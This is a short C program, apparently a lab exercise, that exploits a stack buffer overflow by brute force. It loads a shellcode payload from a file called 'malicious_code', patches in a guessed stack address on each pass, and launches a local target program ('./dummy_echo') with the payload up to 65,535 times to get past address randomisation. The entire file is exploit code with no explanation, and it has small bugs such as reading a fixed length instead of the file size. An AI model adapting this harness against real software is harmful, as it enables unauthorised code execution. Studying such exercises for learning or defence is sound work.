#include <stdio.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <memory.h>

#define INITIAL_STACK_ADDR 0x00007fffffff0000ULL
#define MAX_LEN 200

int main (int argc, const char* argv[])
{
	int fd = open("malicious_code", O_RDONLY);
	if (fd < 0)
		return -1;
	struct stat st;
	fstat(fd, &st);
	void* malicious_code = malloc(st.st_size);
	read(fd, malicious_code, MAX_LEN);
	void* backup = malloc(st.st_size);
	memcpy(backup, malicious_code, st.st_size);

	unsigned int i;
	for (i = 0; i < 0xFFFF; ++i)
	{
		int pid;
		*((unsigned long long*)malicious_code + 7) = INITIAL_STACK_ADDR + i;
		if (!(pid = fork()))
		{
			char* argv[] = {"./dummy_echo",malicious_code, NULL};
			execve("./dummy_echo", argv, NULL);
			exit(0);
		}
		int status;
		waitpid(pid, &status, 0);
		memcpy(malicious_code, backup, st.st_size);
	}
	close(fd);
	free(malicious_code);
	free(backup);
	return 0;
}
